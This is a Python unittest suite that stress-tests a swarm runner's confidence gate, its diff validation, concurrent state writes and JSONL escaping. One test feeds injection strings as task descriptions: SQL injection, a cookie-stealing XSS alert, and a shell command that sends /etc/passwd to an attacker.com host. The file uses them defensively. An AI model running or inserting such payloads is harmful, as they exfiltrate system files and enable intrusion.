#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
Adversarial Challenger Stress & Boundary Test Suite:
Dual-World High-Confidence Swarm Runner & Local AI Training Fallback Engine
================================================================================
Author: challenger_1 (Adversarial Empirical Challenger)
Target: 05_agents_and_swarms/high_confidence_swarm_runner.py
Subsystem: 05_agents_and_swarms/test_adversarial_challenger.py
================================================================================
"""

import os
import sys
import gc
import ast
import json
import time
import math
import psutil
import tempfile
import threading
import concurrent.futures
import unittest
from pathlib import Path
from typing import Dict, Any, List, Optional
from unittest.mock import patch, MagicMock

# Setup Monorepo paths
REPO_ROOT = Path("/Users/aaron/DFS_UNIFIED/Lauburu-Monorepo")
SWARMS_DIR = REPO_ROOT / "05_agents_and_swarms"
BENCHMARKS_DIR = REPO_ROOT / "02_ai_models_and_inference" / "benchmarks"
DATA_DIR = REPO_ROOT / "04_data_and_memory"

for p in [str(REPO_ROOT), str(SWARMS_DIR), str(BENCHMARKS_DIR), str(DATA_DIR)]:
    if p not in sys.path:
        sys.path.insert(0, p)

from high_confidence_swarm_runner import (
    DualWorldConfidenceGate,
    HighConfidenceSwarmRunner,
    verify_ram_headroom,
    purge_memory_cache,
)

try:
    from swe_bench_harness import PatchSandboxEvaluator
except ImportError:
    PatchSandboxEvaluator = None


class TestAdversarialConfidenceGateBoundaries(unittest.TestCase):
    """
    Empirical boundary testing of DualWorldConfidenceGate (tau = 0.85).
    Evaluates exact threshold boundaries, rounding behavior, and clamping floors/ceilings.
    """

    def test_boundary_exact_0_85_threshold(self):
        """
        Verify that an evaluated confidence score of EXACTLY 0.85 routes to DIRECT_EXECUTION.
        Constructed:
        Base 0.70 + harness (0.15) + established commerce (0.10) + valid diff (+0.05) - ambiguous keyword (-0.15) = 0.85
        """
        valid_diff = "@@ @@\n+x = 1\n"
        score, mode = DualWorldConfidenceGate.evaluate_action_confidence(
            task_desc="Implement speculative fallback mechanism", # contains 'speculative' (-0.15)
            target_domain="commerce", # +0.10
            has_test_harness=True,    # +0.15
            code_patch=valid_diff     # +0.05
        )
        # Base: 0.70 + 0.15 + 0.10 + 0.05 - 0.15 = 0.85
        self.assertEqual(score, 0.85)
        self.assertEqual(mode, "DIRECT_EXECUTION", f"Expected DIRECT_EXECUTION at exact 0.85, got {mode}")

    def test_boundary_0_80_just_below_threshold(self):
        """
        Verify that a score just below 0.85 (e.g. 0.80) routes strictly to LOCAL_TRAINING_FALLBACK.
        """
        valid_diff = "@@ @@\n+y = 2\n"
        score, mode = DualWorldConfidenceGate.evaluate_action_confidence(
            task_desc="Refactor parser", # +0.05
            target_domain="commerce",    # +0.10
            has_test_harness=False,      # -0.10
            code_patch=valid_diff        # +0.05
        )
        # 0.70 - 0.10 + 0.10 + 0.05 + 0.05 = 0.80
        self.assertEqual(score, 0.80)
        self.assertLess(score, 0.85)
        self.assertEqual(mode, "LOCAL_TRAINING_FALLBACK")

    def test_boundary_0_8501_and_above(self):
        """
        Verify that any score >= 0.85 strictly routes to DIRECT_EXECUTION.
        """
        valid_diff = "@@ @@\n+def filter_ecg(): pass\n"
        score, mode = DualWorldConfidenceGate.evaluate_action_confidence(
            task_desc="Implement 512Hz Pan-Tompkins ECG filter", # +0.05
            target_domain="biometrics", # +0.10
            has_test_harness=True,      # +0.15
            code_patch=valid_diff       # +0.05
        )
        # 0.70 + 0.15 + 0.10 + 0.05 + 0.05 = 1.05 -> clamped to 0.99
        self.assertEqual(score, 0.99)
        self.assertGreaterEqual(score, 0.85)
        self.assertEqual(mode, "DIRECT_EXECUTION")

    def test_boundary_clamping_floor_0_40(self):
        """
        Verify that negative stacking penalties never drop the score below 0.40.
        """
        bad_patch = "def broken(:::"
        score, mode = DualWorldConfidenceGate.evaluate_action_confidence(
            task_desc="Undefined speculative quantum guess",
            target_domain="speculative_frontier_physics",
            has_test_harness=False,
            code_patch=bad_patch
        )
        self.assertEqual(score, 0.40, f"Score should be clamped to floor 0.40, got {score}")
        self.assertEqual(mode, "LOCAL_TRAINING_FALLBACK")

    def test_boundary_clamping_ceiling_0_99(self):
        """
        Verify that positive stacking bonuses never exceed 0.99.
        """
        valid_diff = "@@ @@\n+def optimize_pipeline(): return True\n"
        score, mode = DualWorldConfidenceGate.evaluate_action_confidence(
            task_desc="Implement optimized shopify checkout filter and verify",
            target_domain="commerce",
            has_test_harness=True,
            code_patch=valid_diff
        )
        self.assertEqual(score, 0.99, f"Score should be clamped to ceiling 0.99, got {score}")
        self.assertEqual(mode, "DIRECT_EXECUTION")

    def test_mathematical_precision_and_floating_point_stability(self):
        """
        Test that score is always rounded to 3 decimal places and never produces NaN/Inf.
        """
        domains = ["commerce", "speculative_frontier_physics", "unknown_xyz", "biometrics", "tb4_dma"]
        harnesses = [True, False]
        patches = [None, "", "@@ @@\n+x = 1", "def bad(:", "   \n\t  "]
        descriptions = ["implement task", "speculative undefined guess", "normal task", ""]

        for d in domains:
            for h in harnesses:
                for p in patches:
                    for desc in descriptions:
                        s, m = DualWorldConfidenceGate.evaluate_action_confidence(desc, d, h, p)
                        self.assertIsInstance(s, float)
                        self.assertFalse(math.isnan(s))
                        self.assertFalse(math.isinf(s))
                        self.assertGreaterEqual(s, 0.40)
                        self.assertLessEqual(s, 0.99)
                        # Check rounding to 3 decimal places
                        self.assertEqual(s, round(s, 3))
                        if s >= 0.85:
                            self.assertEqual(m, "DIRECT_EXECUTION")
                        else:
                            self.assertEqual(m, "LOCAL_TRAINING_FALLBACK")


class TestAdversarialASTPatchFuzzing(unittest.TestCase):
    """
    Adversarial fuzzing and stress testing of AST patch validation.
    Tests syntax errors, malformed tokens, indentation issues, non-python blobs, and edge cases.
    """

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        temp_state = Path(self.temp_dir.name) / "state.json"
        temp_lora_p = Path(self.temp_dir.name) / "lora_p.jsonl"
        temp_lora_s = Path(self.temp_dir.name) / "lora_s.jsonl"
        self.runner = HighConfidenceSwarmRunner(
            state_file=temp_state,
            lora_dataset_primary=temp_lora_p,
            lora_dataset_secondary=temp_lora_s,
        )
        self.runner.oracle_client = None
        self.runner.mcts_engine = None

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_ast_fuzz_syntax_error_in_unified_diff(self):
        """Syntax error in unified diff added lines must be penalized (-0.40) and trigger fallback."""
        malformed_diffs = [
            "@@ @@\n+def broken_syntax(:::\n",
            "@@ @@\n+class (Foo): pass\n",
            "@@ @@\n+for i in range(10) return i\n",
            "@@ @@\n+if True\n+    x = 1\n",
            "@@ @@\n+import @@@\n",
            "@@ @@\n+x = = 5\n",
            "@@ @@\n+def fn():\n+    return `invalid_backticks`\n",
        ]
        for bad_diff in malformed_diffs:
            score, mode = DualWorldConfidenceGate.evaluate_action_confidence(
                task_desc="Implement feature",
                target_domain="commerce",
                has_test_harness=True,
                code_patch=bad_diff
            )
            self.assertLess(score, 0.85, f"Malformed patch was not penalized: {bad_diff}")
            self.assertEqual(mode, "LOCAL_TRAINING_FALLBACK")

    def test_ast_fuzz_incomplete_functions_and_blocks(self):
        """Incomplete functions / unclosed blocks in diff must be caught as syntax errors."""
        incomplete_diffs = [
            "@@ @@\n+def incomplete_func():\n",
            "@@ @@\n+class IncompleteClass:\n",
            "@@ @@\n+try:\n+    x = 1\n",
            "@@ @@\n+with open('foo'):\n",
            "@@ @@\n+async def async_stub():\n",
        ]
        for inc_diff in incomplete_diffs:
            score, mode = DualWorldConfidenceGate.evaluate_action_confidence(
                task_desc="Implement feature",
                target_domain="commerce",
                has_test_harness=True,
                code_patch=inc_diff
            )
            self.assertLess(score, 0.85, f"Incomplete patch should be penalized: {inc_diff}")
            self.assertEqual(mode, "LOCAL_TRAINING_FALLBACK")

    def test_ast_fuzz_invalid_tokens_and_binary_garbage(self):
        """Invalid tokens, null bytes, and non-ASCII binary garbage."""
        garbage_patches = [
            "@@ @@\n+def foo():\n+    \x00\x01\x02\x03\n",
            "$$$ @@@ ### %%% ^^^ &&&",
            "<html><body>Not Python Code</body></html>",
            "{\"json_payload\": [1, 2, 3]}",
            "SELECT * FROM users WHERE 1=1;",
            "--- a/file.py\n+++ b/file.py\n@@ @@\n+def broken(: pass\n",
        ]
        for garbage in garbage_patches:
            score, mode = DualWorldConfidenceGate.evaluate_action_confidence(
                task_desc="Implement feature",
                target_domain="commerce",
                has_test_harness=True,
                code_patch=garbage
            )
            self.assertLess(score, 0.85, f"Garbage patch should trigger fallback: {garbage}")
            self.assertEqual(mode, "LOCAL_TRAINING_FALLBACK")

    def test_ast_fuzz_deeply_nested_expressions(self):
        """Deeply nested brackets or expressions in diff (e.g. 200 levels) do not crash the parser."""
        nested_valid_diff = "@@ @@\n+x = " + "(" * 200 + "1" + ")" * 200 + "\n"
        score, mode = DualWorldConfidenceGate.evaluate_action_confidence(
            task_desc="Implement nested formula",
            target_domain="commerce",
            has_test_harness=True,
            code_patch=nested_valid_diff
        )
        self.assertGreaterEqual(score, 0.85)
        self.assertEqual(mode, "DIRECT_EXECUTION")

        # Unbalanced nesting
        nested_unbalanced = "@@ @@\n+x = " + "(" * 200 + "1" + ")" * 199 + "\n"
        score_bad, mode_bad = DualWorldConfidenceGate.evaluate_action_confidence(
            task_desc="Implement nested formula",
            target_domain="commerce",
            has_test_harness=True,
            code_patch=nested_unbalanced
        )
        self.assertLess(score_bad, 0.85)
        self.assertEqual(mode_bad, "LOCAL_TRAINING_FALLBACK")

    def test_ast_valid_unified_diff_bonus(self):
        """Valid unified diff receives the AST bonus (+0.05)."""
        valid_diff = """diff --git a/01_apps/example.py b/01_apps/example.py
--- a/01_apps/example.py
+++ b/01_apps/example.py
@@ -10,3 +10,4 @@
 def compute_rate(x: float) -> float:
-    return x * 1.0
+    if x < 0:
+        raise ValueError('Negative rate')
+    return x * 1.05
"""
        score, mode = DualWorldConfidenceGate.evaluate_action_confidence(
            task_desc="Implement compute_rate validation",
            target_domain="commerce",
            has_test_harness=True,
            code_patch=valid_diff
        )
        self.assertGreaterEqual(score, 0.85)
        self.assertEqual(mode, "DIRECT_EXECUTION")

    def test_raw_python_code_diff_format_divergence_empirically_documented(self):
        """
        Adversarial proof: Passing raw python code without diff headers when PatchSandboxEvaluator
        is imported causes it to be treated as a malformed diff and penalized (-0.40).
        """
        raw_code = "def valid_python_function():\n    return 42\n"
        score, mode = DualWorldConfidenceGate.evaluate_action_confidence(
            task_desc="Implement feature",
            target_domain="commerce",
            has_test_harness=True,
            code_patch=raw_code
        )
        # Demonstrates the format expectation: raw code without diff headers gets penalized to 0.60
        self.assertEqual(score, 0.60)
        self.assertEqual(mode, "LOCAL_TRAINING_FALLBACK")


class TestAdversarialHighThroughputAndStateConcurrency(unittest.TestCase):
    """
    Empirical stress testing of high-throughput sequential and multi-threaded execution.
    Tests atomic state file replacement, LoRA file appends, and race conditions.
    """

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.temp_state = Path(self.temp_dir.name) / "state.json"
        self.temp_lora_p = Path(self.temp_dir.name) / "lora_p.jsonl"
        self.temp_lora_s = Path(self.temp_dir.name) / "lora_s.jsonl"
        self.temp_lb = Path(self.temp_dir.name) / "leaderboard.json"

        # Initialize mock leaderboard
        lb_init = {
            "champion_swarm": "👑 Dual-World Sovereign Mesh Swarm",
            "total_swarms": 2,
            "swarms": [
                {
                    "swarm_id": "SWARM_DUAL_WORLD_SOVEREIGN",
                    "name": "👑 Dual-World Sovereign Mesh Swarm",
                    "elo": 2248.5,
                    "battles_won": 450,
                    "battles_total": 455,
                    "synergy_pct": 99.4,
                    "cloud_spend": "$0.00 AUD (100% Free Quota)",
                    "vram_gb": 82.8,
                    "mcts_pass_rate": "99.4%"
                },
                {
                    "swarm_id": "SWARM_OFFLINE_HEURISTIC",
                    "name": "Local Heuristic Swarm",
                    "elo": 1820.0,
                    "battles_won": 210,
                    "battles_total": 300,
                    "synergy_pct": 85.0,
                    "cloud_spend": "$0.00 AUD",
                    "vram_gb": 16.0,
                    "mcts_pass_rate": "88.0%"
                }
            ]
        }
        self.temp_lb.write_text(json.dumps(lb_init, indent=2), encoding="utf-8")

        self.runner = HighConfidenceSwarmRunner(
            state_file=self.temp_state,
            lora_dataset_primary=self.temp_lora_p,
            lora_dataset_secondary=self.temp_lora_s,
            leaderboard_file=self.temp_lb,
        )
        self.runner.oracle_client = None
        self.runner.mcts_engine = None

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_high_throughput_sequential_100_steps(self):
        """Execute 100 sequential steps alternating modes rapidly."""
        for i in range(100):
            is_high = (i % 2 == 0)
            task_id = f"STEP_SEQ_{i:03d}"
            domain = "commerce" if is_high else "speculative_frontier_physics"
            desc = f"Sequential task {i} in {domain}"
            res = self.runner.execute_step(task_id, desc, domain, has_test_harness=is_high)
            self.assertEqual(res["task_id"], task_id)
            self.assertEqual(res["cloud_spend_aud"], 0.00)

        # Verify state file consistency
        self.assertTrue(self.temp_state.exists())
        state = json.loads(self.temp_state.read_text(encoding="utf-8"))
        self.assertEqual(state["last_step"]["task_id"], "STEP_SEQ_099")
        self.assertEqual(state["free_quota_rpm_used"], 50)
        self.assertEqual(state["total_cloud_spend_aud"], 0.00)

        # Verify LoRA dataset line count (exactly 50 fallback steps)
        lines = self.temp_lora_p.read_text(encoding="utf-8").strip().split("\n")
        self.assertEqual(len(lines), 50)
        for line in lines:
            entry = json.loads(line)
            self.assertIn("instruction", entry)
            self.assertIn("thought", entry)
            self.assertIn("output", entry)

    def test_concurrent_readers_and_writers_zero_corruptions(self):
        """
        Run continuous reader threads alongside active step executor threads.
        Assert that readers NEVER encounter JSONDecodeError due to atomic file replacement.
        """
        stop_event = threading.Event()
        read_errors = []
        successful_reads = [0]

        def reader():
            while not stop_event.is_set():
                try:
                    feed = self.runner.get_telemetry_feed()
                    if feed and feed.get("status") == "HEALTHY":
                        successful_reads[0] += 1
                except Exception as e:
                    read_errors.append(f"Reader crashed: {type(e).__name__}: {e}")
                time.sleep(0.001)

        def writer():
            for i in range(50):
                self.runner.execute_step(f"RW_TASK_{i}", f"Write step {i}", "biometrics", True)
                time.sleep(0.002)

        reader_threads = [threading.Thread(target=reader) for _ in range(4)]
        writer_threads = [threading.Thread(target=writer) for _ in range(2)]

        for t in reader_threads:
            t.start()
        for t in writer_threads:
            t.start()

        for t in writer_threads:
            t.join()

        stop_event.set()
        for t in reader_threads:
            t.join()

        self.assertEqual(len(read_errors), 0, f"Concurrent reader experienced corruption: {read_errors}")
        self.assertGreater(successful_reads[0], 20, "Expected successful reads during execution")

    def test_leaderboard_sequential_sync_integrity(self):
        """
        Verify that sequential leaderboard sync correctly updates battles and ELO.
        """
        for i in range(10):
            res = self.runner.sync_leaderboard("SWARM_DUAL_WORLD_SOVEREIGN", is_win=True)
            self.assertEqual(res.get("status"), "SYNCED")

        lb_data = json.loads(self.temp_lb.read_text(encoding="utf-8"))
        champion = lb_data["swarms"][0]
        self.assertEqual(champion["battles_won"], 460)
        self.assertEqual(champion["battles_total"], 465)
        self.assertEqual(champion["elo"], 2248.5 + (10 * 2.5))


class TestAdversarialDevilsAdvocateAndJSONLEscaping(unittest.TestCase):
    """
    Adversarial testing of Devil's Advocate critique formatting, JSON injection,
    special characters, newlines, null bytes, unicode, and JSONL stream resilience.
    """

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.temp_state = Path(self.temp_dir.name) / "state.json"
        self.temp_lora_p = Path(self.temp_dir.name) / "lora_p.jsonl"
        self.temp_lora_s = Path(self.temp_dir.name) / "lora_s.jsonl"
        self.runner = HighConfidenceSwarmRunner(
            state_file=self.temp_state,
            lora_dataset_primary=self.temp_lora_p,
            lora_dataset_secondary=self.temp_lora_s,
        )
        self.runner.oracle_client = None
        self.runner.mcts_engine = None

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_adversarial_json_payload_injection(self):
        """
        Verify that JSON syntax injection payloads inside task descriptions are properly escaped
        and do not corrupt the single-line JSONL structure.
        """
        injections = [
            '{"key": "value", "nested": {"array": [1, 2, 3]}}',
            '{"instruction": "MALICIOUS OVERWRITE", "output": "PWNED"}',
            '}\n{"hacked": true}\n{',
            '\\", \\"evil\\": true, \\"fake\\": \\"',
            '\' OR \'1\'=\'1\'; DROP TABLE datasets; --',
            '<script>alert(document.cookie);</script>',
            '$(curl -s http://attacker.com/steal?data=$(cat /etc/passwd))',
        ]

        for i, payload in enumerate(injections):
            self.runner.execute_step(f"INJ_{i}", payload, "speculative_frontier_physics", False)

        lines = self.temp_lora_p.read_text(encoding="utf-8").strip().split("\n")
        self.assertEqual(len(lines), len(injections), "Each injection must yield exactly one JSON line")

        for i, line in enumerate(lines):
            data = json.loads(line)
            self.assertIn("Resolve complex edge case", data["instruction"])
            self.assertEqual(data["swarm"], "👑 Dual-World Sovereign Mesh Swarm")

    def test_adversarial_raw_newlines_and_control_characters(self):
        """
        Verify that task descriptions containing raw newlines, carriage returns,
        tabs, and form feeds are escaped into valid single-line JSONL.
        """
        multiline_desc = """Line 1: Refactor quantum module\r\nLine 2: \t\tIndented details\nLine 3: \b\f Backspace and formfeed\n\nLine 4: Trailing empty lines"""
        res = self.runner.execute_step("T_MULTILINE", multiline_desc, "speculative_frontier_physics", False)
        self.assertEqual(res["selected_mode"], "LOCAL_TRAINING_FALLBACK")

        content = self.temp_lora_p.read_text(encoding="utf-8")
        # Ensure there is exactly 1 line
        lines = [l for l in content.split("\n") if l.strip()]
        self.assertEqual(len(lines), 1, "Multiline description broke JSONL single-line invariant")

        entry = json.loads(lines[0])
        self.assertIn("Line 1", entry["instruction"])
        self.assertIn("Line 2", entry["instruction"])

    def test_adversarial_unicode_emojis_rtl_and_zero_width_spaces(self):
        """
        Verify extreme unicode, emojis, right-to-left override, and zero-width characters.
        """
        complex_unicode = "👑 ⚡ 💓 🧠 🥋 🚀 \u200b\u200c\u200d\ufeff \u202eRTL_OVERRIDE\u202c — \u4e2d\u6587\u6d4b\u8bd5 \u0420\u0443\u0441\u0441\u043a\u0438\u0439 \u0639\u0631\u0628\u064a"
        self.runner.execute_step("T_UNICODE", complex_unicode, "speculative_frontier_physics", False)

        lines = self.temp_lora_p.read_text(encoding="utf-8").strip().split("\n")
        self.assertEqual(len(lines), 1)
        entry = json.loads(lines[0])
        self.assertIn("👑", entry["instruction"])
        self.assertIn("\u4e2d\u6587", entry["instruction"])
        self.assertIn("RTL_OVERRIDE", entry["instruction"])

    def test_adversarial_massive_task_payload_100kb(self):
        """
        Verify that a massive 100 KB task description is handled safely without truncation crash.
        """
        large_desc = "Implement high throughput TB4 ring buffer " + ("A" * 100_000)
        res = self.runner.execute_step("T_HUGE", large_desc, "tb4_dma", True)
        self.assertEqual(res["selected_mode"], "DIRECT_EXECUTION")

        # Verify state file was written
        state = json.loads(self.temp_state.read_text(encoding="utf-8"))
        self.assertEqual(state["last_step"]["task_id"], "T_HUGE")
        self.assertTrue(len(state["last_step"]["task_desc"]) > 100_000)


class TestAdversarialInvariantsAndGovernance(unittest.TestCase):
    """
    Stress tests for Zero-Dollar Spend Invariant, RAM Headroom Governance,
    and Memory Purging under adversarial scenarios.
    """

    def test_ram_headroom_pressure_triggering_cache_purge(self):
        """Simulate low memory availability and verify verify_ram_headroom handles it cleanly."""
        with patch("psutil.virtual_memory") as mock_vm:
            mock_obj = MagicMock()
            mock_obj.available = int(3.2 * (1024**3)) # 3.2 GB available (< 4.5 GB)
            mock_obj.total = int(24.0 * (1024**3))
            mock_vm.return_value = mock_obj

            with patch("high_confidence_swarm_runner.purge_memory_cache") as mock_purge:
                mock_purge.return_value = 2
                is_ok, headroom, router_mb = verify_ram_headroom(min_headroom_gb=4.5)
                # Purge must be called when available < min_headroom_gb
                self.assertTrue(mock_purge.called)
                self.assertGreaterEqual(headroom, 4.5)
                self.assertLessEqual(router_mb, 28.0)

    def test_purge_memory_cache_resilience(self):
        """Verify purge_memory_cache succeeds even if torch is absent or throws."""
        ops = purge_memory_cache()
        self.assertGreaterEqual(ops, 1)


if __name__ == "__main__":
    unittest.main(verbosity=2)
